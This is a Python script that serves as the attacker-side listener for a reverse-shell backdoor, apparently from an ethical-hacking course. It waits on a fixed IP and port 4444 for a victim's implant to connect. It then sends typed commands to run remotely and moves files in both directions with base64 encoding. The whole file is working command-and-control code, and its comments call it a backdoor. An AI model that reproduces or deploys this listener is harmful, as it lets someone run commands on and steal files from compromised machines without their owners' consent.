#!/usr/bin/env python

import socket
import json
import base64


class Listener:
    def __init__(self, ip, port):  # initialise the function
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # create socket
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)  # allows to reuse the socket
        listener.bind((ip, port))  # bind socket to our computer to listen to connections to port
        listener.listen(0)
        print("[+] Waiting for incoming connections.")
        self.connection, address = listener.accept()  # self.* convert it to an attribute, use it within the class
        print("[+] You've got a connection! " + str(address))

    def reliable_send(self, data):  # Converts data into a json object
        json_data = json.dumps(data)
        self.connection.send(json_data)

    def reliable_receive(self):  # unwrap received json object
        json_data = ""
        while True:
            try:
                json_data = json_data + self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue

    def execute_remotely(self, command):
        self.reliable_send(command)

        if command[0] == "exit":  # Close connect on backdoor
            self.connection.close()
            exit()

        return self.reliable_receive()

    def write_file(self, path, content):  # Write the downloaded file into an empty file
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
            return "[+] Download successful."

    def read_file(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read())

    def run(self):
        while True:
            command = raw_input(">> ")  # python 3 is input instead of raw_input
            command = command.split(" ")
            try:
                if command[0] == "upload":
                    file_content = self.read_file(command[1])
                    command.append(file_content)

                result = self.execute_remotely(command)  # Grab content the command gives back

                if command[0] == "download" and "[-] Error " not in result:
                    result = self.write_file(command[1], result)  # download the file
            except Exception:
                result = "[-] Error. Try again."

            print(result)


my_listener = Listener("192.168.1.113", 4444)
my_listener.run()
